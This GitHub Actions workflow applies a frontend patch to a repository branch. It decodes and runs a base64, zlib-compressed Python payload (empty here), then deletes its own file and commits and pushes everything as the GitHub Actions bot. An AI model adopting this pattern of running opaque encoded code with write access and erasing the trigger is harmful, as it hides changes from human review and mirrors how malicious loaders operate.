name: Apply demand-data r9
on:
  push:
    branches: [akiya-rescue-cloudflare]
    paths: ['.github/workflows/apply-demand-data-r9.yml']
permissions:
  contents: write
jobs:
  apply:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: akiya-rescue-cloudflare
          fetch-depth: 0
      - name: Apply r9 source patch
        shell: bash
        run: |
          python - <<'PY'
          import base64,zlib
          payload=''
          src=zlib.decompress(base64.b64decode(payload)).decode('utf-8')
          exec(compile(src,'patch_frontend_r9.py','exec'))
          PY
      - name: Commit r9 and remove temporary workflow
        shell: bash
        run: |
          rm -f .github/workflows/apply-demand-data-r9.yml
          git config user.name 'github-actions[bot]'
          git config user.email '41898282+github-actions[bot]@users.noreply.github.com'
          git add -A
          git commit -m 'Add customer demand data platform frontend r9'
          git push origin HEAD:akiya-rescue-cloudflare
